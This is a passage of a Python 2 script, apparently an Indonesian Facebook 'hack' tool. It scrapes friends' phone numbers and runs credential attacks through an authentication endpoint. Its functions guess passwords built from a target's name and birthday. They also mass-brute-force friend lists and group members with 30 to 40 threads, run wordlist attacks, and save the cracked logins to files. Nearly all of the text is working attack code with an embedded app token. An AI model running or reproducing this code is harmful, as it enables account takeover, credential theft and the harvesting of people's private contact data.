		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()
		
##### NOMER #####
def nomor_hp():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		jalan('\033[1;91m[✺] \033[1;92mGet all friend number phone \033[1;97m...')
		print 42*"\033[1;97m═"
		url= "https://graph.facebook.com/me/friends?access_token="+toket
		r =requests.get(url)
		z=json.loads(r.text)
		bz = open('out/nomer_teman.txt','w')
		for n in z["data"]:
			x = requests.get("https://graph.facebook.com/"+n['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				hp.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(hp))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/nomer_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

##### NOMER FROM TEMAN #####
def hpfrom_teman():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend number from friend \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/no_teman_from_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				hpfromteman.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(hpfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hpfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/no_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()
    
##### MENU HACK #####
def menu_hack():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Mini Hack Facebook(\033[1;92mTarget\033[1;97m)"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Multi Bruteforce Facebook"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Super Multi Bruteforce Facebook"
	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m BruteForce(\033[1;92mTarget\033[1;97m)"
	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Yahoo Checker"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	hack_pilih()
#----pilih
def hack_pilih():
	hack = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if hack=="":
		print "\033[1;91m[!] Wrong input"
		hack_pilih()
	elif hack =="1":
		mini()
	elif hack =="2":
		crack()
		hasil()
	elif hack =="3":
		super()
	elif hack =="4":
		brute()
	elif hack =="5":
		menu_yahoo()
	elif hack =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		hack_pilih()
		
##### MINI HF #####
def mini():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\n       with your account first!"
	print 42*"\033[1;97m═"
	try:
		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")
		jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		a = json.loads(r.text)
		print '\033[1;91m[➹] \033[1;92mName\033[1;97m : '+a['name']
		jalan('\033[1;91m[+] \033[1;92mCheck \033[1;97m...')
		time.sleep(2)
		jalan('\033[1;91m[+] \033[1;92mOpen password \033[1;97m...')
		time.sleep(2)
		print 42*"\033[1;97m═"
		pz1 = a['first_name']+'12345'
		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		y = json.load(data)
		if 'access_token' in y:
			print "\033[1;91m[+] \033[1;92mFound"
			print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
			print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
			print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			menu_hack()
		else:
			if 'www.facebook.com' in y["error_msg"]:
				print "\033[1;91m[+] \033[1;92mFound"
				print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
				print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
				print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
				raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
				menu_hack()
			else:
				pz2 = a['sayang'] 
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				y = json.load(data)
				if 'access_token' in y:
					print "\033[1;91m[+] \033[1;92mFound"
					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
					raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
					menu_hack()
				else:
					if 'www.facebook.com' in y["error_msg"]:
						print "\033[1;91m[+] \033[1;92mFound"
						print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
						raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
						menu_hack()
					else:
						pz3 = a['last_name'] + '123'
						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						y = json.load(data)
						if 'access_token' in y:
							print "\033[1;91m[+] \033[1;92mFound"
							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
							raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
							menu_hack()
						else:
							if 'www.facebook.com' in y["error_msg"]:
								print "\033[1;91m[+] \033[1;92mFound"
								print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
								menu_hack()
							else:
								lahir = a['birthday']
								pz4 = lahir.replace('/', '')
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								y = json.load(data)
								if 'access_token' in y:
									print "\033[1;91m[+] \033[1;92mFound"
									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
									raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
									menu_hack()
								else:
									if 'www.facebook.com' in y["error_msg"]:
										print "\033[1;91m[+] \033[1;92mFound"
										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
										menu_hack()
									else:
										lahirs = a['birthday']
										gaz = lahirs.replace('/', '')
										pz5 = a['first_name']+gaz
										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
										y = json.load(data)
										if 'access_token' in y:
											print "\033[1;91m[+] \033[1;92mFound"
											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
											raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
											menu_hack()
										else:
											if 'www.facebook.com' in y["error_msg"]:
												print "\033[1;91m[+] \033[1;92mFound"
												print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
												menu_hack()
											else:
												pz6 = "kontol123"
												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
												y = json.load(data)
												if 'access_token' in y:
													print "\033[1;91m[+] \033[1;92mFound"
													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
													raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
													menu_hack()
												else:
													if 'www.facebook.com' in y["error_msg"]:
														print "\033[1;91m[+] \033[1;92mFound"
														print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
														menu_hack()
													else:
														pz7 = "sayang123"
														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
														y = json.load(data)
														if 'access_token' in y:
															print "\033[1;91m[+] \033[1;92mFound"
															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
															raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
															menu_hack()
														else:
															if 'www.facebook.com' in y["error_msg"]:
																print "\033[1;91m[+] \033[1;92mFound"
																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu_hack()
															else:
																print "\033[1;91m[!] Sorry, failed to open the target password :("
																print "\033[1;91m[!] try it another way."
																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
																menu_hack()
	except KeyError:
		print "\033[1;91m[!] Terget not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_hack()
										
								
##### Multi Brute Force #####
##### CRACK ####
def crack():
	global idlist,passw,file
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
	passw = raw_input('\033[1;91m[+] \033[1;92mPassword \033[1;91m: \033[1;97m')
	try:
		file = open((idlist), "r")
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		for x in range(40):
			zedd = threading.Thread(target=scrak, args=())
			zedd.start()
			threads.append(zedd)
		for zedd in threads:
			zedd.join()
	except IOError:
		print ("\033[1;91m[!] File not found")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu_hack()
		
def scrak():
	global berhasil,cekpoint,gagal,back,up
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		buka = open(idlist, "r")
		up = buka.read().split()
		while file:
			username = file.readline().strip()
			url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(passw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
			data = urllib.urlopen(url)
			mpsh = json.load(data)
			if back == (len(up)):
				break
			if 'access_token' in mpsh:
				bisa = open("out/mbf_ok.txt", "w")
				bisa.write(username+"|"+passw+"\n")
				bisa.close()
				x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
				z = json.loads(x.text)
				berhasil.append("\033[1;97m[ \033[1;92mOK✓\033[1;97m ] "+username+"|" +passw+" =>"+z['name'])
			elif 'www.facebook.com' in mpsh["error_msg"]:
				cek = open("out/mbf_cp.txt", "w")
				cek.write(username+"|"+passw+"\n")
				cek.close()
				cekpoint.append("\033[1;97m[ \033[1;93mCP✚\033[1;97m ] "+username+"|" +passw)
			else:
				gagal.append(username)
				back +=1
			sys.stdout.write('\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack    \033[1;91m:\033[1;97m '+str(back)+' \033[1;96m>\033[1;97m '+str(len(up))+' =>\033[1;92mLive\033[1;91m:\033[1;96m'+str(len(berhasil))+' \033[1;97m=>\033[1;93mCheck\033[1;91m:\033[1;96m'+str(len(cekpoint)));sys.stdout.flush()
	except IOError:
		print"\n\033[1;91m[!] Sleep"
		time.sleep(1)
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		
def hasil():
	print
	print 42*"\033[1;97m═"
	###Berhasil
	for b in berhasil:
		print(b)
	###CEK
	for c in cekpoint:
		print(c)
	###Gagal
	print 42*"\033[1;97m═"
	print ("\033[31m[x] Failed \033[1;97m--> " + str(len(gagal)))
	keluar()
	
############### SUPER MBF ################
def super():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	print "1]. Crack list friend"
	print "2]. Crack  from friend"
	print "3]. Crack from member group"
	print "0]. Back"
	print "║"
	pilih_super()

def pilih_super():
	peak = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if peak =="":
		print "\033[1;91m[!] Wrong input"
		pilih_super()
	elif peak =="1":
		os.system('reset')
		print logo
		jalan('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mGet all id from friend \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('reset')
		print logo
		idg=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
	elif peak =="0":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong input"
		pilih_super()
		
	print "\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print 42*"\033[1;97m═"
	
			
	##### crack #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			#Pass1
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print("\033[1;97m[ \033[1;92mDone\033[1;97m ] "+user+"|" +pass1+" =>"+z['name'])
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					#Pass2
					pass2 = "sayang"
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
						z = json.loads(x.text)
						print("\033[1;97m[ \033[1;92mDone\033[1;97m ] "+user+"|" +pass2+" =>"+z['name'])
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							#Pass3
							pass3 = b['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								z = json.loads(x.text)
								print("\033[1;97m[ \033[1;92mDone\033[1;97m ] "+user+"|" +pass3+" =>"+z['name'])
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									#Pass4
									pass4 = "ganteng"
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										z = json.loads(x.text)
										print("\033[1;97m[ \033[1;92mDone\033[1;97m ] "+user+"|" +pass4+" =>"+z['name'])
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											#Pass5
											pass5 = b['last_name']+'123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
												z = json.loads(x.text)
												print("\033[1;97m[ \033[1;92mDone\033[1;97m ] "+user+"|" +pass5+" =>"+z['name'])
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal OK/CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;91m[+] \033[1;92mCP File saved \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	super()
######################################################

##### BRUTE FORCE #####
def brute():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo
	try:
		email = raw_input("\033[1;91m[+] \033[1;92mID\033[1;97m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
		passw = raw_input("\033[1;91m[+] \033[1;92mWordlist \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
		total = open(passw,"r")
		total = total.readlines()
		print 42*"\033[1;97m═"
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTarget \033[1;91m:\033[1;97m "+email
		print "\033[1;91m[+] \033[1;92mTotal\033[1;96m "+str(len(total))+" \033[1;92mPassword"
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		sandi = open(passw,"r")
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;91m: \033[1;97m"+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				if 'access_token' in mpsh:
					dapat = open("Brute.txt", "w")
					dapat.write(email+" | "+pw+"\n")
					dapat.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					keluar()
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("Brutecekpoint.txt", "w")
					ceks.write(email+" | "+pw+"\n")
					ceks.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					keluar()
			except requests.exceptions.ConnectionError:
				print"\033[1;91m[!] Connection Error"
				time.sleep(1)
	except IOError:
		print ("\033[1;91m[!] File not found")
		tanyaw()
def tanyaw():
	why = raw_input("\033[1;91m[?] \033[1;92mCreate wordlist ? \033[1;92m[y/n]\033[1;91m:\033[1;97m ")
	if why =="":
